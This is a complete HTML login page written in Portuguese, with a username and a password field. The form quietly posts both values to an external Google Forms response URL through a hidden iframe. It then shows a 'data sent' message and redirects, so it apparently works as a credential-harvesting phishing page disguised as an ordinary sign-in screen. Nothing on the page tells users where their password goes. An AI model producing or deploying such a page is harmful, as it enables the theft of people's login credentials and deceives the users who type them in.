<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Login</title>

<style>
body {
    margin: 0;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background: #0b6623;
    font-family: Arial, sans-serif;
}

.box {
    background: white;
    padding: 30px;
    border-radius: 10px;
    width: 300px;
    text-align: center;
}

.box input {
    width: 100%;
    padding: 10px;
    margin-bottom: 15px;
}

.box button {
    width: 100%;
    padding: 10px;
    background: #1faa59;
    color: white;
    border: none;
    cursor: pointer;
}

.msg {
    margin-top: 15px;
    color: green;
    display: none;
}
</style>

<script>
function enviado() {
    document.getElementById("msg").style.display = "block";

    // opcional: redirecionar após 2 segundos
    setTimeout(() => {
        window.location.href = "index.html"; // sua página principal
    }, 2000);
}
</script>
</head>

<body>

<form
  class="box"
  action="https://docs.google.com/forms/d/e/1FAIpQLSeSeRnZOIDPGFqEu49Kr-R2iM9xtyCZlth3WFllY_h0sHHAlg/formResponse"
  method="POST"
  target="hidden_iframe"
  onsubmit="enviado()"
>
    <h3>Login</h3>

    <input
      type="text"
      name="entry.1803232493"
      placeholder="Usuário"
      required
    >

    <input
      type="password"
      name="entry.888810994"
      placeholder="Senha"
      required
    >

    <button type="submit">Entrar</button>

    <div class="msg" id="msg">
        ✔ Dados enviados com sucesso
    </div>
</form>

<iframe name="hidden_iframe" style="display:none;"></iframe>

</body>
</html>
